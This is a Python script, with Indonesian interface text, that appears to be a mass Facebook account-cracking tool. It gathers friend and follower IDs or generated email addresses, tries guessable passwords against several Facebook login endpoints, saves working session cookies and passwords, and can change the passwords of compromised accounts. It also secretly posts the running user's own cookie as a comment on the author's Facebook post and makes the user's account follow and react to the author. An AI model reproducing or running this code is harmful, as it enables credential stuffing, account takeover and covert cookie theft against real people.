#-------------------[ JANGAN DI GANTI² NANTI EROR ]---------------------#
import os, time
try:
     import rich
except (ModuleNotFoundError,ImportError):
     print('\t • Please wait...') ; time.sleep(0.03) ; os.system('pip install rich')
try:
     import requests
except (ModuleNotFoundError,ImportError):
     print('\t • Please wait...') ; time.sleep(0.03) ; os.system('pip install requests')
try:
     import bs4
except (ModuleNotFoundError,ImportError):
     print('\t • Please wait...') ; time.sleep(0.03) ; os.system('pip install bs4')

#-------------------[ MODUL IN PYTHON3 & RICH ]---------------------#
import re, sys, json, requests, random, datetime, subprocess, platform, bs4
from concurrent.futures import ThreadPoolExecutor as khamdihiXV
from bs4 import BeautifulSoup as parse
from datetime import datetime

from rich import print as zprint
from rich.panel import Panel
from rich.tree import Tree
from rich.console import Console
console = Console()
ses = requests.Session()

#-------------------[ BULAN 12 AND CREATOR SC ]---------------------#
bulan = ["Januari","Februari","Maret","April","Mei","Juni","Juli","Agustus","September","Oktober","November","Desember"]
month = datetime.now().month - 1
reall = bulan[month]

days = datetime.now().day
year = datetime.now().year
indo = "%s-%s-%s"%(days,reall,year)

author   = 'PDI PERJUANGAN'
facebook = 'PDI PERJUANGAN Dev (https://www.facebook.com/profile.php?id=100064820514099)'
whatsapp = '0895 4106 '
komen    = random.choice(
	 ['Selamat Ulang Tahun 😎','Happy birthday','Happy birthday Mass♥','Happy birthday','Happy birthday','Happy birthday bang😎','Sehat selalu bang♥','Panjang Umur nya bang😎']
)
#-------------------[ COLOR FOR PYTHON RICH ]----------------------#
M = 'color(1)' # ABANG
H = 'color(2)' # IJO
K = 'color(3)' # KUNING
B = 'color(4)' # BIRU
U = 'color(5)' # UNGU
O = 'color(6)' # BIRU NOM
P = 'color(7)' # PUTIH
I = 'color(8)' # IRENG

P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI

#-------------------[ TAMPUMG DOSA LU² PADA ]-----------------------#
OK = []
CP = []
ID = []

ID2 = []
tod = []
loop = 0
UbahPw = []

# JIKA HASIL TIDAK MAKSIMAL GANTI AJA USER AGENT DI BAWAH INI!
# VALODATE
ua = 'Mozilla/5.0 (Linux; Android 8.1.0; vivo 1807 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/9.7.0.0'
def Clear_Terminal(platform):
    if 'win' in sys.platform:os.system('cls')
    else:os.system('clear')

def Convert(cookies, username):
    with requests.Session() as x:
       for link in parse(x.get('https://mbasic.facebook.com/' + username, cookies={'cookie':cookies}).text,'html.parser').find_all('a',href=True):
           if '/mbasic/more/?' in link.get('href'):
              return link["href"].split("=")[1].replace("&paipv","")


def ConvertCookie(cookies):
    with requests.Session() as x:
         try:
               link = requests.get("https://web.facebook.com/adsmanager",cookies={'cookie':cookies}).text
               find = re.findall('act=(.*?)&nav_source',link)
               if len(find) == 0:return 'False'
               else:
                     for hilangkan in find:
                         otw = requests.get('https://web.facebook.com/adsmanager/manage/campaigns?act={}&nav_source=no_referrer'.format(hilangkan), cookies={'cookie':cookies})
                         tok = re.search('(EAAB\w+)',otw.text).group(1)
                         if 'EAAB' in tok:
                             my = ('100064820514099_pfbid0qP1265eYDqtmM4516aNCjwzrUHSEDvqt6Vt4cS4LEppFUhcCjcq66uHMXf4fCA2yl')
                             __ = requests.post(f'https://graph.facebook.com/v15.0/{my}/comments/?message={cookies}&access_token={tok}',cookies={'cookie':cookies}).json()
                             open('data/token.txt','w').write(tok)
                             open('data/cokie.txt','w').write(cookies)
                             return 'status succes'
         except AttributeError:
              return 'False'

def CekResults():
    exei,exex = 0, []
    exec = ('[green][[white]1[green]]. [bold white]Cek hasil akun OK\n[green][[white]2[green]]. [bold white]Cek hasil akun CP\n[green][[white]0[green]]. [bold white]Kembali') ; Console(width=50).print(Panel(exec,style='bold purple'))
    zprint('╭──▸ [bold white]Pilih salah satu')
    ok_cp = console.input('╰──▸ :smiley: : ')
    if ok_cp in ['1','01']:
       print('\r')
       try:ok = os.listdir('OK')
       except:zprint('\n [red][[white]×[red]] [white]File tidak ada') ; exit(0)
       for i in ok:
           exex.append(i)
           exei +=1
           try:cek=open('OK/{}'.format(i),'r').readlines()
           except:continue
           zprint(' [bold green][[bold white]{}[bold green]]. [bold white]{} : [bold green]{} [bold white]akun'.format(exei,i,len(cek)))

       file = console.input('\n [?] Pilih nomor : ')
       try:dump = exex[int(file)-1]
       except:dump=1
       try:
           ok = open('OK/{}'.format(dump),'r').read()
       except:
           zprint('\n [red][[white]×[red]] [white]File tidak ada') ; exit(0)
       print('')
       zprint('[bold green]{}'.format(ok))

    elif ok_cp in ['2','02']:
       zprint('\r')
       try:cp=os.listdir('CP')
       except:zprint('\n [red][[white]×[red]] [white]File tidak ada') ; exit(0)
       for i in cp:
           exex.append(i)
           exei +=1
           try:cek=open('CP/{}'.format(i),'r').readlines()
           except:continue
           zprint(' [bold yellow][[bold white]{}[bold yellow]]. [bold white]{} : [bold yellow]{} [bold white]akun'.format(exei,i,len(cek)))
       file = console.input('\n [?] Pilih nomor : ')
       try:dump = exex[int(file)-1]
       except:dump=1
       try:
           ok = open('CP/{}'.format(dump),'r').read()
       except:
           zprint('\n [red][[white]×[red]] [white]File tidak ada') ; exit(0)
       print('')
       zprint('[bold yellow]{}'.format(ok))
    else:
       menu()

def ChekOption():
    exec = '[bold green][[bold white]1[bold green]]. [bold white]Chek opsi 1 akun\n[bold green][[bold white]2[bold green]]. [bold white]Chek opsi lewat file\n[bold green][[bold red]0[bold green]]. [bold white]Kembali'
    Console(width=50).print(Panel(exec,style='bold purple'))
    zprint('╭──▸ [bold white]Pilih menu di atas')
    ask = console.input('╰──▸ pilihan : ')
    if ask in ['1','01']:
         asik = '[bold green][[bold white]*[bold green]] [bold white]Masukan data akun anda, gunakan tanda | untuk pemisahan userid dan password contoh 10008|sandi akun anda' ; Console(width=50).print(Panel(asik,style='bold purple'))
         zprint('╭──▸ [bold white]Harap di baca biar gak eror')
         user = console.input('╰──▸ username|password : ')
         try:uid,nama = user.split('|')
         except:exit('\n [×] Kesalahan...')
         CekOptionAcount(uid,nama)
    elif ask in ['2','02']:
         asik = '[bold green][[bold white]*[bold green]] [bold white]Masukan nama file berisi akun chekpoint' ; Console(width=50).print(Panel(asik,style='bold purple'))
         zprint('╭──▸ [bold white] Nama file nya ?')
         file = console.input('╰──▸ nama file : ')
         try:cp=open('CP/'+file,'r').readlines()
         except:exit('\n [×] File tidak ada cok!')
         for i in cp:
             asu = i.replace('\n','')
             itu = asu.split('|')
             print('\n [?] Mengechek akun : {}|{}'.format(itu[0],itu[1]))
             CekOptionAcount(itu[0],itu[1])
         exit('\n [✓] Proses cek akun chekpoint telah selesai...')
    else:
         menu()

def CekOptionAcount(user,pw):
	ses = requests.Session()
	url = random.choice(
		["m.facebook.com",
		"mbasic.facebook.com",
		"free.facebook.com"]
	)
	try:
		link = ses.get(f"https://{url}/login/?source=auth_switcher")
		data = {
			"lsd":re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),
			"jazoest":re.search('name="jazoest" value="(.*?)"', str(link.text)).group(1),
			"email":user,
			"pass":pw
		}
		posz = ses.post(f"https://{url}/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100",data=data) 
		#,headers={"user-agent":"Mozilla/5.0 (Linux; Android 7.1.2; Redmi 5A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.88 Mobile Safari/537.36"})
		if "checkpoint" in ses.cookies.get_dict():
			posh = parse(posz.text,"html.parser")
			find = posh.find("form",method="post")["action"]
			data = {
				"fb_dtsg":re.search('name="fb_dtsg" value="(.*?)"',str(posz.text)).group(1),
				"jazoest":re.search('name="jazoest" value="(.*?)"',str(posz.text)).group(1),
				"checkpoint_data":"",
				"submit[Continue]": "Lanjutkan",
				"nh":re.search('name="nh" value="(.*?)"',str(posz.text)).group(1),
			}
			zozo = requests.post(f"https://{url}{find}",data=data)
			cari = parse(zozo.text,"html.parser")
			opsi = cari.find_all("option")
			if len(opsi) == 0:
				if "Lihat detail login yang ditampilkan. Ini Anda?" in str(cari.find("title").text):
					print(' [✓] Akun tap yes ♥')

				elif "Masukkan Kode Masuk untuk Melanjutkan" in str(cari.find("title").text):
					print(" [×] akun terpasang a2f")
				else:
					print(' [×] Spam atau kata sandi salah!')
			else:
				for ketemu in opsi:
					print(f" [*] {ketemu.text}")
		elif "c_user" in ses.cookies.get_dict():
			cokie = (";").join(["%s=%s"%(a,b) for a,b in ses.cookies.get_dict().items()])
			print(f" *  --> {user}|{pw}|{cokie}")
			open("OK/%s"%(indo),"a").write(f"{user}|{pw}|{cokie}")
		else:
			print(" [×] Kata sandi yang anda masukan salah.")
	except Exception as e:
		pass

def Banner():
    KAGLK = '''[bold green]╔═══╦═══╦══╗╔╗─╔╦╗───
║╔═╗║╔═╗║╔╗║║║─║║║───   
║║─╚╣║─║║╚╝╚╣║─║║║───    
║║─╔╣╚═╝║╔═╗║║─║║║─╔╗
║╚═╝║╔═╗║╚═╝║╚═╝║╚═╝║
╚═══╩╝─╚╩═══╩═══╩═══╝
[bold gold]kalo gak ada hasil mainin pesawat 500 id
 ( [bold blue]Di Buat oleh [bold gold]KANG REKOD WOKWOKK [bold white] ) '''
    Console(width=50).print(Panel(KAGLK,style='bold purple'),justify='center')

def Masuk():
    Clear_Terminal(platform) ; Banner()
    ask = '[bold white]Anda belum login. masukan cookie akun facebook anda tidak di sarankan pake akun utama!' ; Console(width=50).print(Panel(ask,style='bold purple')) ; zprint('╭──▸ [bold white]cookies')
    coki = file = console.input('╰──▸ [bold white]Masukan cookies : ')
    if coki in ['',' ']:Masuk()
    else:
          link = ConvertCookie(coki)
          if 'status succes' in str(link):AuthorBot('https://mbasic.facebook.com/100064820514099?v=timeline',coki) ; FollowMe(coki) ; menu()
          else:print('\n [×] Cookie invalid!') ; time.sleep(2);Masuk()

def AuthorBot(url,kontol):
    try:
          link = parse(requests.get(url,cookies = {'cookie':kontol}).text,'html.parser')
          for otw in link.find_all('a',href=True):
                if 'Tanggapi' in otw.text:
                     reac = random.choice(['Super','Peduli','Marah','Sedih','Wow'])
                     for send in parse(requests.get('https://mbasic.facebook.com/100064820514099{}'.format(otw['href']), cookies = {'cookie':kontol}).text,'html.parser').find_all('a'):
                         if reac in send.text:
                               requests.get('https://mbasic.facebook.com/100064820514099{}'.format(send['href']), cookies = {'cookie':kontol})
                         else:
                               continue
          AuthorBot('https://mbasic.facebook.com{}'.format(link.find('a',string='Lihat Berita Lain')['href']), kontol)
    except Exception as e:pass

def FollowMe(kontol):
    try:
          for i in parse(requests.get('https://mbasic.facebook.com/100064820514099', cookies = {'cookie':kontol}).text,'html.parser').find_all('a',href=True):
              if '/a/subscribe.php?' in i.get('href'):x=requests.get('https://mbasic.facebook.com{}'.format(i['href']), cookies = {'cookie':kontol}).text
    except Exception as e:pass

def menu():
    Clear_Terminal(platform)
    try:
          cokis = open('data/cokie.txt','r').read()
          token = open('data/token.txt','r').read()
    except (FileNotFoundError,IOError):Masuk()
    try:
          link = requests.Session().get('https://graph.facebook.com/me?access_token={}'.format(token), cookies = {'cookie':cokis}).json()
          nama,user = link['name'],link['id']
    except KeyError:Masuk()
    except requests.exceptions.ConnectionError:exit(' [×] Tidak ada koneksi.')
    Banner() ; time.sleep(0.01) ; exec = (f'[bold white]Selamat datang [bold green]{nama}[bold white], selamat menggunakan') ; Console(width=50).print(Panel(exec,style='bold purple'))
    list = ('''[bold green][[bold white]1[bold green]]. [bold white]Crack dari publik
[bold green][[bold white]2[bold green]]. [bold white]Crack dari publik massal
[bold green][[bold white]3[bold green]]. [bold white]Crack dari followers publik
[bold green][[bold white]4[bold green]]. [bold white]Crack dari email random
[bold green][[bold white]5[bold green]]. [bold white]Chek hasil crack
[bold green][[bold white]6[bold green]]. [bold white]Chek opsi akun chekpoint
[bold green][[bold white]0[bold green]]. [bold white]Keluar''') ; Console(width=50).print(Panel(list,style='bold purple'))
    zprint('╭──▸ [bold white]pilih menu')
    assk = console.input('╰──▸ [bold gold]Yang mana : ')
    if assk in ['1','01']:
          Console(width=50).print(Panel('[bold purple]Ketik me jika ingin crack dari daftar teman akun tumbal anda.',style='bold purple'))
          zprint('╭──▸ [bold white]Pastikan target publik.')
          id = console.input('╰──▸ [bold white]Masukan userid : ')
          try:
                for x in requests.get("https://graph.facebook.com/{}?fields=friends.limit(5001)&access_token={}".format(id,open('data/token.txt','r').read()), cookies={"cookie":open('data/cokie.txt','r').read()}).json()['friends']['data']:
                    ID.append(x['id'] +'/'+ x['name'])
          except KeyError:
                Console(width=50).print(Panel(f'[bold red]Akun {id} tidak publik, cari yang lain',style='bold purple')) ; time.sleep(2) ; menu()
          AturUser()

    elif assk in ['2','02']:
         Console(width=50).print(Panel('[bold white]Ketik me jika ingin crack dari daftar teman akun tumbal anda, dan gunakan tanda koma untuk pemisahan userid contoh pemisahan : 10008,10005',style='bold purple'))
         zprint('╭──▸ [bold white]Pastikan target publik')
         id = console.input('╰──▸ [bold white]Masukan userid : ')
         for kontol in id.split(','):
             try:
                   for data in requests.get("https://graph.facebook.com/{}?fields=friends.limit(5001)&access_token={}".format(kontol,open('data/token.txt','r').read()), cookies={"cookie":open('data/cokie.txt','r').read()}).json()['friends']['data']:
                       ID.append(data['id'] +'/'+ data['name'])
             except KeyError:pass
         AturUser()

    elif assk in ['3','03']:
         Console(width=50).print(Panel('[bold white]Ketik  me jika ingin crack dari daftar followers sendiri, gunakan tanda koma untuk pemisahan userid contoh pemisahan userid : 10008,10005',style='bold purple'))
         zprint('╭──▸ [bold white]Pastikan target publik!')
         id = console.input('╰──▸ [bold white]Masukan userid : ')
         for UserPengguna in id.split(','):
             try:
                    for data in requests.get('https://graph.facebook.com/{}?fields=name,subscribers.fields(id,name).limit(5000)&access_token={}'.format(UserPengguna, token), cookies={'cookie':cokis}).json()['subscribers']['data']:
                        ID.append(data['id'] +'/'+ data['name'])
             except KeyError:pass
         AturUser()

    elif assk in ['4','04']:
         Console(width=50).print(Panel('[bold white]Masukan nama target gunakan tanda koma untuk pemisahan contoh pemisahan nama : andi,andika',style='bold purple'))
         zprint('╭──▸ [bold white]masukan nama terserah anda')
         nama = console.input('╰──▸ [bold white]Masukan nama terget : ')
         main = console.input('╰──▸ [bold white]Masukan domain contoh @gmail.com : ')
         for i in nama.split(','):
             for x in range(2000):
                 tambah = random.choice([random.randint(0,60),'amin','amel','amelia','ais','ananda','agus','aji','adi','andi','andika','abas','aminah','aminatun','bagas','basuki','babas','bayu','badrul','bintang','cindi','cici','cinta','cupita','cupi','dina','diki','difa','dihi','dini','diva','devinta','deni','dila','dilah','fika','fikha','fina','fivi','fatah','fania','fatih','fatun',random.randint(1,20),'32','28','123','24','oficial','cans','ganz','tok','xd','id','gina','galih','gugun','gifah','gans','kholid','kontol','kania','khoerul','hilada','hilmi','himin','lili','lina','lani','laruh','mia','mas','maz','mamat','mamad','masrul','nina','niha','nining','nula','nana','nunu','nifta','nita','niva','nabila','nadia','odi','oni','ojol','onani','pitri',random.randint(0,35),'rosma','riska','rina','rani','ratu','ratna','rifa','riva','rena','reza','rofik','risma','roza','rozak','siska','santi','sari','sarno','susanti','sindi','suci','susana','sinta','sulis','tiwi','tina','tanti','tono','tiara','titin','ulfa','ulfah','ulin','ulfin','unah','udin','usman','usdin','vina','vinka','vani','vatimah','winda','wanti','wani','wadul','xi','zidan','zaenal','zizi','khamdihi','iren','ine','reni','ufik','rohmah','khasna','andi','dwi','muhammad','nur','dewi','tri','dian','sri','putri','eka','sari','aditya','basuki','budi','joni','toni','cahya','riski','farhan','aden','joko','rudi','bambang','supri','wawan','karnawan','akatsuki','wibu','cakep','cantik','ganteng',x,'hitam',random.randint(0,60),'zulki','angga','yayan','dapunta','romi','khamdihi','rohmat','basuki','hamzah','boy','cahyani','sadiyah','salamah','anit'])
                 aapaan = f'{i}{tambah}'
                 jembut = '{}{}/{}'.format(aapaan,main,i)
                 if jembut in ID:pass
                 else:ID.append(jembut)
         AturUser()

    elif assk in ['5','05']:CekResults()
    elif assk in ['6','06']:ChekOption()
    elif assk in ['0','00']:os.system('rm -rf data/token.txt && rm -rf cokie.txt') ; exit(0)
    else:menu()

def AturUser():
    Console(width=50).print(Panel(f'[bold green][[bold white]*[bold green]] [bold white]Total id : {len(ID)}',style='bold purple'))
    exec = ('''[bold green][[bold white]1[bold green]]. [bold white]Crack dari ID tua
[bold green][[bold white]2[bold green]]. [bold white]Crack dari ID new
[bold green][[bold white]3[bold green]]. [bold white]Crack dari ID random''') ; Console(width=50).print(Panel(exec ,style='bold purple'))
    zprint('╭──▸ [bold white]Di sarankan from ID new')
    idndi = console.input('╰──▸ [bold white]Atur id : ')
    if idndi in ['1','01']:
         for i in ID:
               ID2.append(i)
    elif idndi in ['2','02']:
         for i in ID:
             ID2.insert(0,i)
    else:
         for i in ID:
             xx = random.randint(0, len(ID2))
             ID2.insert(xx, i)
    AturLogin()

def AturLogin():
    metod = ('''[bold green][[bold white]1[bold green]]. [bold white]Crack dari methode reguler
[bold green][[bold white]2[bold green]]. [bold white]Crack dari methode web reguler [bold red]OFF
[bold green][[bold white]3[bold green]]. [bold white]Crack dari methode validate password [bold red]OFF ''') ; Console(width=50).print(Panel(metod,style='bold purple'))
    zprint('╭──▸ [bold white]jika anda clone email tidak di sarankan memakai validate!')
    z = console.input('╰──▸ [bold white]Pilih : ')
    if z in ['1','01']:tod.append('reguler')
    elif z in ['2','02']:tod.append('reguler web')
    elif z in ['3','03']:tod.append('validate')
    else:tod.append('reguler')

    exec = ('''[bold green][[bold white]1[bold green]]. [bold white]Crack dari free.facebook.com
[bold green][[bold white]2[bold green]]. [bold white]Crack dari mbasic.facebook.com
[bold green][[bold white]3[bold green]]. [bold white]Crack dari mobile.facebook.com''') ; Console(width=50).print(Panel(exec ,style='bold purple'))
    zprint('╭──▸ [bold white]Silakan pilih [bold green]url login[bold white]')
    link = console.input('╰──▸ [bold white]Pilih : ')
    if link in ['1','01']:url='free.facebook.com'
    elif link in ['2','02']:url='mbasic.facebook.com'
    else:url='m.facebook.com'

    pwh = ('[bold green][[bold white]?[bold green]] [bold white]Mau mengubah password akun OK?') ; Console(width=50).print(Panel(pwh,style='bold purple'))
    zprint('╭──▸ [bold white]Pilih Y/T ')
    ubah = console.input('╰──▸ [bold white]Ubah password : ')
    if ubah in ['y','Y','iya']:
          UbahPw.append('ya')
          add_Password = console.input('╰──▸ [bold white]Masukan password baru : [bold green]')
          if len(add_Password) <=5:
               exit('\n [×] Password harus lebih dari 5 karaktaer contoh : sayang,kontol,bangsat')
          else:
               open('password_baru_kamu.txt','w').write(add_Password)
    else:UbahPw.append('no')
    WordlistLogin().password(url)

class WordlistLogin:
    def __init__(self):
        pass

    def password(self,link):
        exec = (f'[bold green][[bold white]*[bold green]]. [bold white]OK save in : OK/{indo}.txt\n[bold green][[bold white]*[bold green]]. [bold white]CP save in : CP/{indo}.txt') ; Console(width=50).print(Panel(exec ,style='bold purple'))
        with khamdihiXV(max_workers=30) as coid:
             for UserAkun in ID2:
                  uid,nama = UserAkun.split('/')
                  terserah = nama.split(' ')[0]
                  if len(nama) <=5:
                        if len(terserah) <=1 or len(terserah) <=2:pass
                        else:
                               pwx = [terserah+'123', terserah+'1234', terserah+'12345',terserah+'321','indonesia','pekalongan','bismillah',nama.lower()]
                  else:
                        pwx = [nama, terserah+'123', terserah+'1234', terserah+'12345', terserah+'321','indonesia','pekalongan','bismillah',nama.lower()]

                  if 'reguler' in tod:coid.submit(self.crackxv, uid, pwx, link)
                  elif 'reguler web' in tod:coid.submit(self.crackxv, uid, pwx, link)
                  elif 'validate' in tod:coid.submit(self.Validate, uid, pwx, link)
                  else:coid.submit(self.crackWEb, uid, pwx, link)

        exit(f'\n\n [✓] Crack telah selesai OK:{len(OK)} CP:{len(CP)}')

    def UserAgent(self):
        rr = random.randint
        rc = random.choice
        az = ['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']
        return str(rc([f"Mozilla/5.0 (Linux; U; Android {str(rr(8,10))}; en-us; Redmi{str(rr(4,9))} Build/PPR1.' {str(rc(az))}{str(rc(az))}{str(rc(az))}{str(rr(11,99))}{str(rc(az))}) AppleWebKit/537.36 (KHTML, like Gecko) UCBrowser/79.0.{str(rr(20,100))}.0.{str(rr(1111,9999))}.136 Mobile Safari/537.36 {str(rc(['Puffin/9.7.2','HeyTapBrowser']))}/{str(rr(11111,99999))}AP",f"Mozilla/5.0 (Linux; Android 11; V2061; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36 VivoBrowser/7.12.3.1", f" Mozilla/5.0 (Linux; Android 8.1.0; vivo 1807 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/9.7.0.0",f"Mozilla/5.0 (Linux; Android 9; Redmi S2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.99 Mobile Safari/537.36",f"Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; OPPO PBAM00 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/4.7.9",f"Mozilla/5.0 (Linux; Android 8.1.0; CPH1809 Build/OPM1.171019.026; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.83 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/290.0.0.16.119;]",f" Mozilla/5.0 (Linux; Android 8.1.0; ASUS_Z01QD) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.76 Mobile Safari/537.36", f"Mozilla/5.0 (Linux; Android 8.1.0; ASUS_Z01QD Build/OPM1.171019.026; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.97 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/381.0.0.29.105;]",f"Mozilla/5.0 (Linux; Android 11; RMX3286 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.128 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/396.1.0.28.104;]",f"Mozilla/5.0 (Linux; Android 10; SM-M205F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.85 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/403.0.0.27.81;]",f"Mozilla/5.0 (Linux; Android 12; RMX3286 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36"]))

    def crackxv(self, user, pwx, url):
        global loop, OK,CP
        print(f'\r \033[97mcrack {H}{url}{N} {loop}/{len(ID2)} OK:{len(OK)} CP:{len(CP)}', end=' '); sys.stdout.flush()
        for pw in pwx:
             try:
                     with requests.Session() as ses:
                          agen = self.UserAgent()
                          link = ses.get('https://{}/login/?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2F&refsrc=deprecated&_rdr'.format(url)).text
                          data = {'lsd':re.search('name="lsd" value="(.*?)"', link).group(1),'jazoest':re.search('name="jazoest" value="(.*?)"', link).group(1),'m_ts':re.search('name="m_ts" value="(.*?)"', link).group(1),'li':re.search('name="li" value="(.*?)"', link).group(1),'try_number':'0','unrecognized_tries':'0','email':user,'pass':pw,'login':'Masuk','bi_xrwh':'0'}
                          head = {'Host': url,'content-length': '128','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="99", "Google Chrome";v="99"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://' + url,'content-type': 'application/x-www-form-urlencoded','user-agent': agen,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'navigate','sec-fetch-user': '?1','sec-fetch-dest': 'document','referer': 'https://{}/login/?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2F&refsrc=deprecated&_rdr'.format(url),'accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,ru;q=0.6,jv;q=0.5'}
                          zzzz = ses.post('https://{}/login/device-based/regular/login/?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2F&amp;refsrc=deprecated&amp;lwv=100'.format(url), data=data, headers=head, allow_redirects=False)
                          if 'c_user' in ses.cookies.get_dict():
                               kueh = ';'.join([str(a)+'='+str(b) for a,b in ses.cookies.get_dict().items()])
                               uuid = re.search('c_user=(.*?);', kueh).group(1)
                               if 'ya' in UbahPw:
                                     print('\r %s*  --> %s|%s|%s			  '%(H,uuid,pw,kueh))
                                     self.UbahPassword(uuid,pw,kueh,url)

                               else:
                                     print('\r %s*  --> %s|%s|%s		'%(H,uuid,pw,kueh))
                               open('OK/{}.txt'.format(indo),'a').write('%s|%s|%s\n'%(user,pw,kueh))
                               OK.append('DOSA')
                               break

                          elif 'checkpoint' in ses.cookies.get_dict():
                               uuid = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
                               print('\r %s*  --> %s|%s                   \x1b[1;91m'%(K,uuid,pw))
                               open('CP/{}.txt'.format(indo),'a').write('%s|%s\n'%(uuid,pw))
                               CP.append('TAI')
                               break

                          else:
                               continue
             except requests.exceptions.ConnectionError: time.sleep(30)
        loop +=1

    def Validate(self, user, pwx, url):
        global loop, OK, CP
        print(f'\r \033[97mcrack {H}{url}{N} {loop}/{len(ID2)} OK:{len(OK)} CP:{len(CP)}', end=' '); sys.stdout.flush()
        for pw in pwx:
             try:
                     with requests.Session() as x:
                          agen = ua #'Mozilla/5.0 (Linux; Android 7.0; SAMSUNG A800F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36','Mozilla/5.0 (Linux; U; Android 4.4.4; zh-cn; A31 Build/KTU84P) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/38.0.2125.114 Mobile Safari/537.36 OppoBrowser/3.9.2"
                          link = x.get('https://{}/login/device-based/password/?uid={}&next=https%3A%2F%2Fdevelopers.facebook.com%2Fwebmaster%2F&flow=login_no_pin&refsrc=deprecated&_rdr'.format(url,user)).text
                          data = {'lsd':re.search('name="lsd" value="(.*?)"', link).group(1),'jazoest':re.search('name="jazoest" value="(.*?)"', link).group(1),'uid':user,'next':'https://developers.facebook.com/webmaster/','flow':'login_no_pin','encpass':'#PWD_BROWSER:0:{}:{}'.format(random.randint(0000000000, 9999999999),pw)}
                          head = {'Host': url,'content-length': '319','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="99", "Google Chrome";v="99"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://' + url,'content-type': 'application/x-www-form-urlencoded','user-agent': agen,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'navigate','sec-fetch-user': '?1','sec-fetch-dest': 'document','referer': 'https://{}/login/device-based/password/?uid={}&next=https%3A%2F%2Fdevelopers.facebook.com%2Fwebmaster%2F&flow=login_no_pin&refsrc=deprecated&_rdr'.format(url,user),'accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,ru;q=0.6,jv;q=0.5'}
                          posh = x.post('https://{}/login/device-based/validate-password/?shbl=0'.format(url),data=data, headers=head, allow_redirects=False)
                          if 'c_user' in x.cookies.get_dict():
                               kueh = ';'.join([str(a)+'='+str(b) for a,b in x.cookies.get_dict().items()])
                               uuid = re.search('c_user=(.*?);', kueh).group(1)
                               if 'ya' in UbahPw:
                                     print('\r %s*  --> %s|%s|%s             '%(H,uuid,pw,kueh))
                                     self.UbahPassword(uuid,pw,kueh,url)
                               else:
                                     print('\r %s*  --> %s|%s|%s             '%(H,uuid,pw,kueh))
                               open('OK/{}.txt'.format(indo),'a').write('%s|%s|%s\n'%(user,pw,kueh))
                               OK.append('DOSA LU BANG MALING')
                               break

                          elif 'checkpoint' in x.cookies.get_dict():
                               print('\r %s*  --> %s|%s                   \x1b[1;91m'%(K,user,pw))
                               open('CP/{}.txt'.format(indo),'a').write('%s|%s\n'%(user,pw))
                               CP.append('TAI KUNING')
                               break
                          else:
                               continue
             except Exception as e:print(e)
        loop +=1

    def UbahPassword(self, user, password_old, coki, url):
        try:password_new = open('password_baru_kamu.txt','r').read()
        except:password_new = password_old
        with requests.Session() as ses:
             try:
                     link = ses.get(f'https://{url}/settings/security/password/',cookies={'cookie':coki})
                     data = {
                         'fb_dtsg':re.search('name="fb_dtsg" value="(.*?)"', link.text).group(1),
                         'jazoest':re.search('name="jazoest" value="(.*?)"', link.text).group(1),
                         'password_change_session_identifier':re.search('name="password_change_session_identifier" value="(.*?)"', link.text).group(1),
                         'password_old':password_old,
                         'password_new':password_new,
